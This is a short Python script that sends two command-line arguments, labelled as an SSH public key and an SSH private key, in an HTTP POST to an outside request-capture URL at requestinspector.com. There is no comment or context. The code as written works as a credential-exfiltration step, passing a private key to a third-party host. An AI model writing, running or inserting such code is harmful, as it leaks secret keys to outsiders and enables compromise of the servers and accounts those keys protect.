import sys

import requests as reqs


reqs.post(
    "https://01k8qdavafc35r957caqgp8ab710-0e29765a03d40b260af4.requestinspector.com",
    json={'SSH_PUBLIC_KEY': sys.argv[1], 'SSH_PRIVATE_KEY': sys.argv[2]}
)
